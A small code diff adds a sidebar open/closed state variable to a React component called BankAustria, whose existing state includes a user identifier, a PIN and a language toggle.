@@ -43,6 +43,7 @@ const BankAustria = () => {
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [activeLang, setActiveLang] = useState<"de" | "en">("de");
+  const [sidebarOpen, setSidebarOpen] = useState(false);
 
   return (
     <div
